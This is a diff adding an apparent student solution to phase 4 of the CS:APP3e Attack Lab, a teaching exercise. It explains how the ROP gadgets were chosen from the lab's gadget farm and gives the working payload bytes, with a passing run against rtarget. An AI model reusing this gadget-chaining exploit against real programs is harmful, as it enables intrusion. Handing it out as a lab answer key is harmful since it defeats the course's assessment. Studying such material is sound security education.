@@ -1,0 +1,137 @@
+/* Byte codes for the phase 4 of attack bomb in CS:APP3e
+
+   Copyright (C) 2022 Tongjie Liu <tongjieandliu@gmail.com>.
+
+   This program is free software: you can redistribute it and/or modify
+   it under the terms of the GNU General Public License as published by
+   the Free Software Foundation, either version 3 of the License, or
+   (at your option) any later version.
+
+   This program is distributed in the hope that it will be useful,
+   but WITHOUT ANY WARRANTY; without even the implied warranty of
+   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+   GNU General Public License for more details.
+
+   You should have received a copy of the GNU General Public License
+   along with this program.  If not, see <https://www.gnu.org/licenses/>. */
+
+/*	1. Insturctions we need:
+	popq	%rax		# 0x58
+	movq	%rax, %rdi	# 0x48 0x89 0xc7
+	ret			# 0xc3
+
+
+	2. Find gadgets
+	There are 3 instructions that we need. The ret insturctions are in all
+gadgets, hence we don't have to find a gadget for it. Therefore, we only need
+to find 2 gadgets. one for popq %rax(58 in hexadecimal), another for movq %rax,
+%rdi(48 89 c7 in hexadecimal).
+
+	Gadgets the phase 4 provides to us are: start_farm, getval_142, addval_
+273, addval_219, setval_237, setval_424, setval_470, setval_426, getval_280,
+mid_farm.
+
+	We may use objdump to disassemble these functions:
+	0000000000401994 <start_farm>:
+	  401994:       b8 01 00 00 00          mov    $0x1,%eax
+	  401999:       c3                      retq
+
+	000000000040199a <getval_142>:
+	  40199a:       b8 fb 78 90 90          mov    $0x909078fb,%eax
+	  40199f:       c3                      retq
+
+	00000000004019a0 <addval_273>:
+	  4019a0:       8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
+	  4019a6:       c3                      retq
+
+	00000000004019a7 <addval_219>:
+	  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
+	  4019ad:       c3                      retq
+
+	00000000004019ae <setval_237>:
+	  4019ae:       c7 07 48 89 c7 c7       movl   $0xc7c78948,(%rdi)
+	  4019b4:       c3                      retq
+
+	00000000004019b5 <setval_424>:
+	  4019b5:       c7 07 54 c2 58 92       movl   $0x9258c254,(%rdi)
+	  4019bb:       c3                      retq
+
+	00000000004019bc <setval_470>:
+	  4019bc:       c7 07 63 48 8d c7       movl   $0xc78d4863,(%rdi)
+	  4019c2:       c3                      retq
+
+	00000000004019c3 <setval_426>:
+	  4019c3:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
+	  4019c9:       c3                      retq
+
+	00000000004019ca <getval_280>:
+	  4019ca:       b8 29 58 90 c3          mov    $0xc3905829,%eax
+	  4019cf:       c3                      retq
+
+	00000000004019d0 <mid_farm>:
+	  4019d0:       b8 01 00 00 00          mov    $0x1,%eax
+	  4019d5:       c3                      retq
+
+	Unfortunately, the 2 insturctions we prepared are not found in these
+functions. In other words, we should modify them slightly. The most convenient
+method is to substitute the register %rax with another register which has
+already been specified in these functions.
+
+	As we can see, popq instructions all has the form of 5x in hexadecimal,
+and movq x, %rdi instructions the form of 48 89 xx in hexadecimal. But there
+is a requirement the chosen gadgets must satisfy: the register used in popq is
+also the the source register used in movq. Therefore, the instructions we need
+to find have the form of 48 89 xx c3 and 5x c3, and c3 is the encoding of ret
+instruction.
+
+	The candidate for 48 89 xx c3 is the following:
+	00000000004019a0 <addval_273>:
+	  4019a0:       8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
+	  4019a6:       c3                      retq
+And there is no candidate for 5x c3. This urge us to lower our expectationis,
+and add nop to the gadgets we would like to find. The new goal is then 5x 90
+c3. Here are the candidates:
+	00000000004019a7 <addval_219>:
+	  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
+	  4019ad:       c3                      retq
+
+	00000000004019ca <getval_280>:
+	  4019ca:       b8 29 58 90 c3          mov    $0xc3905829,%eax
+	  4019cf:       c3                      retq
+
+	They both satisfy the requirement, and the sharing register between
+movq and popq is %rax. Here we choose addval_219, but we could also choose
+getval_280 if we want.
+
+	We conclude with the final instructions we execute:
+	popq	%rax		# gadget addval_219 at 0x4019ab
+	nop			# gadget addval_219 at 0x4019ab
+	movq	%rax, %rdi	# gadget addval_273 at 0x4019a2
+	ret			# gadget addval_273 at 0x4019a2
+
+
+	3. Attack with this file:
+	$ cat phase_4.txt | ./hex2raw | ./rtarget -q
+	Cookie: 0x59b997fa
+	Type string:Touch2!: You called touch2(0x59b997fa)
+	Valid solution for level 2 with target rtarget
+	PASS: Would have posted the following:
+		user id bovik
+		course  15213-f15
+		lab     attacklab
+		result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00
+	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+	00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2
+	19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 */
+00 00 00 00 00 00 00 00 /* zeros */
+00 00 00 00 00 00 00 00 /* zeros */
+00 00 00 00 00 00 00 00 /* zeros */
+00 00 00 00 00 00 00 00 /* zeros */
+00 00 00 00 00 00 00 00 /* zeros */
+
+ab 19 40 00 00 00 00 00 /* address of the gadget addval_219 in little endian */
+fa 97 b9 59 00 00 00 00 /* cookie */
+
+a2 19 40 00 00 00 00 00 /* address of the gadget addval_273 in little endian */
+
+ec 17 40 00 00 00 00 00 /* address of touch2 in little-endian */
